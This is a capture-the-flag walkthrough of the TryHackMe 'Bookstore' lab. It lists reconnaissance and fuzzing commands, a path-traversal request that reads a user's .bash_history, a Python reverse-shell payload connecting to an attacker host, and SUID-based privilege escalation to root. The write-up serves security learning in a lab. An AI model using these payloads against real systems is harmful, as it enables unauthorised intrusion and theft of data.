# Multi-Step Cyber Attack Simulation – Commands & Exploits
## Overview
This file documents the **exact commands and methodology** used during the Bookstore CTF (TryHackMe). It demonstrates the **hands-on penetration testing workflow** from reconnaissance → exploitation → privilege escalation → root access.

---

## Reconnaissance
### Scan for open ports with RustScan

```bash
rustscan -a <TARGET_IP> --ulimit 5000
```

* Found open ports:

  * `22` (SSH)
  * `80` (HTTP)
  * `5000` (Flask API service)

### Verify API is accessible

```bash
curl http://<TARGET_IP>:5000/api
```

---

## Web Enumeration
### Directory brute forcing with GoBuster

```bash
gobuster dir -u http://<TARGET_IP>:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Inspect login page source for hints

```bash
curl -s http://<TARGET_IP>/login | grep "debugger pin"
```

---

## Exploitation

### Check JavaScript assets for API version hints

```bash
curl http://<TARGET_IP>/assets/js/api.js
```

* Comment indicates **file inclusion vulnerability in API v1**.

### Switch to vulnerable API version

```bash
curl http://<TARGET_IP>:5000/api/v1/
```

### Fuzz vulnerable API endpoint for file inclusion

```bash
ffuf -u http://<TARGET_IP>:5000/api/v1/show?file=FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -mc all
```

### Retrieve `.bash_history` (exfil debugger PIN)

```bash
curl http://<TARGET_IP>:5000/api/v1/show?file=../../../../home/sid/.bash_history
```

### Extract Werkzeug Debugger PIN (example: `123-321-135`)

---

## Reverse Shell
### Start Netcat listener

```bash
nc -lvnp 4444
```

### Use Werkzeug console to spawn reverse shell

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/bash")
```

### Confirm shell access

```bash
whoami
cat /home/sid/user.txt
```

---

## Privilege Escalation
### Check for SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

* Found suspicious binary: `/home/sid/try-harder`

### Transfer binary to attacker machine for analysis

```bash
scp sid@<TARGET_IP>:/home/sid/try-harder /home/attacker/
```

### Decompile with Ghidra → Identify required **magic number**

### Execute with magic number (example: `1573743953`)

```bash
./try-harder 1573743953
```

### Escalate to root & capture flag

```bash
whoami
cat /root/root.txt
```

## Outcome

* **User flag captured** → `user.txt`
* **Privilege escalation achieved** → root access
* **Root flag captured** → `root.txt`

---

⚡ *This simulation was conducted in a controlled TryHackMe lab environment with no real-world systems harmed.*  